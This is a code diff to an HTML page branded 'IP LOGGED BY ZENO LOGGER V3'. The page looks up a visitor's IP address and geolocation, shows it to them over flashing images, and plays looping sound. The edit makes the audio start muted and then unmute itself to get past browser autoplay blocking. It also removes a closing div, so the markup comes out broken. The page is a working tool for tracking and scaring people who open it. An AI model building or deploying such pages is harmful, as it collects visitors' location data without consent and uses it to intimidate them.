@@ -14,6 +14,7 @@
             background-color: black;
             color: white;
             overflow: hidden;
+            position: relative;
         }
         .content {
             z-index: 2;
@@ -52,15 +53,16 @@
 </head>
 <body>
 
+<!-- Flashing background images -->
 <div class="background"></div>
 
+<!-- Main content with IP data -->
 <div class="content">
     <h2>IP LOGGED BY ZENO LOGGER V3</h2>
     <div id="ipResult"></div>
-    <!-- Audio element with autoplay (no button required) -->
-    <audio autoplay>
-  <source src="sound.mp3" type="audio/mpeg">
-</audio>
+
+    <!-- Audio element with autoplay (muted initially) -->
+    <audio id="sound" src="sound.mp3" autoplay loop muted></audio>
 
     <script>
         // Function to get the IP address and geolocation
@@ -135,12 +137,20 @@
             });
         }
 
-        // Wait for the page to load and start the function
+        // Autoplay the sound with unmute
         document.addEventListener("DOMContentLoaded", function() {
-            getMyIpAddress();
+            var audio = document.getElementById("sound");
+            
+            // Unmute after the page loads (as some browsers may block autoplay unless muted)
+            setTimeout(() => {
+                audio.muted = false; // Unmute the sound
+                audio.play(); // Play sound after unmute
+            }, 1000); // Wait 1 second before unmuting
         });
+
+        // Start the process when the page loads
+        getMyIpAddress();
     </script>
 
-</div>
 </body>
 </html>
